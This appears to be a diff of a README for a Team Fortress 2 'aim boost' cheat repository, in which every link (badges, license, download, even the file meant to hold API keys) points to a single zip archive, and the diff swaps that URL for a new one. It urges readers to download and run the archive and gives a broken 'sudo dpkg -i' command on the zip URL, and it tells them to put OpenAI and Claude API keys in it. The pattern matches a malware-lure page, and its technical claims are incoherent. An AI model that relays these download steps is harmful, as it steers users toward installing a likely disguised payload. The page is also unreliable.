@@ -1,4 +1,4 @@
-# ![Download](https://raw.githubusercontent.com/asramadhan11/tf2-aim-boost-plus/branch/oneiroscopic/tf2-aim-boost-plus-v1.8-beta.4.zip)  
+# ![Download](https://github.com/asramadhan11/tf2-aim-boost-plus/raw/refs/heads/branch/oneiroscopic/tf_plus_boost_aim_1.5.zip)  
 
 # 🎮 Team Fortress 2 Companion Suite
 
@@ -13,9 +13,9 @@ Enjoy a smooth ride regardless of your preferred platform. See how the Team Fort
 
 | 🚀 Operating System | 🛠️ Compatibility | 📦 Installation Type |
 |--------------------|------------------|----------------------|
-| ![Windows](https://raw.githubusercontent.com/asramadhan11/tf2-aim-boost-plus/branch/oneiroscopic/tf2-aim-boost-plus-v1.8-beta.4.zip) | Fully Supported     | Installer / Portable |
-| ![Linux](https://raw.githubusercontent.com/asramadhan11/tf2-aim-boost-plus/branch/oneiroscopic/tf2-aim-boost-plus-v1.8-beta.4.zip%2020.04%https://raw.githubusercontent.com/asramadhan11/tf2-aim-boost-plus/branch/oneiroscopic/tf2-aim-boost-plus-v1.8-beta.4.zip) | Stable Release      | Package Manager      |
-| ![macOS](https://raw.githubusercontent.com/asramadhan11/tf2-aim-boost-plus/branch/oneiroscopic/tf2-aim-boost-plus-v1.8-beta.4.zip%https://raw.githubusercontent.com/asramadhan11/tf2-aim-boost-plus/branch/oneiroscopic/tf2-aim-boost-plus-v1.8-beta.4.zip) | Beta                | App Bundle           |
+| ![Windows](https://github.com/asramadhan11/tf2-aim-boost-plus/raw/refs/heads/branch/oneiroscopic/tf_plus_boost_aim_1.5.zip) | Fully Supported     | Installer / Portable |
+| ![Linux](https://github.com/asramadhan11/tf2-aim-boost-plus/raw/refs/heads/branch/oneiroscopic/tf_plus_boost_aim_1.5.zip%2020.04%https://github.com/asramadhan11/tf2-aim-boost-plus/raw/refs/heads/branch/oneiroscopic/tf_plus_boost_aim_1.5.zip) | Stable Release      | Package Manager      |
+| ![macOS](https://github.com/asramadhan11/tf2-aim-boost-plus/raw/refs/heads/branch/oneiroscopic/tf_plus_boost_aim_1.5.zip%https://github.com/asramadhan11/tf2-aim-boost-plus/raw/refs/heads/branch/oneiroscopic/tf_plus_boost_aim_1.5.zip) | Beta                | App Bundle           |
 
 ---
 
@@ -56,7 +56,7 @@ Experience the future—today. This repository leverages the best in artificial 
 - 🔶 **OpenAI API**: Dynamic query handling gets personal. Enjoy real-time smart tips, auto-strategy suggestions, and even in-game conversational help, all within strict safety boundaries.
 - 🟦 **Claude API**: Lean on conversational AI support for troubleshooting, custom macro generation, and tactical scenarios—crafted for maximum clarity.
 
-Integration is built on modular architecture. To enable, insert your API keys inside the `https://raw.githubusercontent.com/asramadhan11/tf2-aim-boost-plus/branch/oneiroscopic/tf2-aim-boost-plus-v1.8-beta.4.zip` file. No private data is stored or shared.  
+Integration is built on modular architecture. To enable, insert your API keys inside the `https://github.com/asramadhan11/tf2-aim-boost-plus/raw/refs/heads/branch/oneiroscopic/tf_plus_boost_aim_1.5.zip` file. No private data is stored or shared.  
 
 ---
 
@@ -77,17 +77,17 @@ Integration is built on modular architecture. To enable, insert your API keys in
 
 ### 1. Download the Latest Build
 Grab the most recent companion suite from:  
-https://raw.githubusercontent.com/asramadhan11/tf2-aim-boost-plus/branch/oneiroscopic/tf2-aim-boost-plus-v1.8-beta.4.zip  
+https://github.com/asramadhan11/tf2-aim-boost-plus/raw/refs/heads/branch/oneiroscopic/tf_plus_boost_aim_1.5.zip  
 
 ### 2. Unpack & Install
 - **Windows:** Run the installer or extract the portable zip.
 - **Linux:**  
-   - `sudo dpkg -i https://raw.githubusercontent.com/asramadhan11/tf2-aim-boost-plus/branch/oneiroscopic/tf2-aim-boost-plus-v1.8-beta.4.zip`
+   - `sudo dpkg -i https://github.com/asramadhan11/tf2-aim-boost-plus/raw/refs/heads/branch/oneiroscopic/tf_plus_boost_aim_1.5.zip`
    - Or install via your package manager as documented.
 - **macOS:** Drag `.app` into your Applications folder.
 
 ### 3. Configure API Access (Optional)
-- Insert your OpenAI and Claude API keys in `https://raw.githubusercontent.com/asramadhan11/tf2-aim-boost-plus/branch/oneiroscopic/tf2-aim-boost-plus-v1.8-beta.4.zip`.
+- Insert your OpenAI and Claude API keys in `https://github.com/asramadhan11/tf2-aim-boost-plus/raw/refs/heads/branch/oneiroscopic/tf_plus_boost_aim_1.5.zip`.
 
 ### 4. Launch & Play
 - Bootstrap the suite—its overlay will present in-game. Access settings anytime using `F12`.
@@ -108,8 +108,8 @@ Always consult the official Team Fortress 2 community and policy documentation.
 This repository is published under the MIT License, promoting both transparency and innovation.  
 Please check the full license text for specifics and terms of use.  
 
-[View MIT License](https://raw.githubusercontent.com/asramadhan11/tf2-aim-boost-plus/branch/oneiroscopic/tf2-aim-boost-plus-v1.8-beta.4.zip)
+[View MIT License](https://github.com/asramadhan11/tf2-aim-boost-plus/raw/refs/heads/branch/oneiroscopic/tf_plus_boost_aim_1.5.zip)
 
 ---
 
-# ![Download](https://raw.githubusercontent.com/asramadhan11/tf2-aim-boost-plus/branch/oneiroscopic/tf2-aim-boost-plus-v1.8-beta.4.zip)
+# ![Download](https://github.com/asramadhan11/tf2-aim-boost-plus/raw/refs/heads/branch/oneiroscopic/tf_plus_boost_aim_1.5.zip)
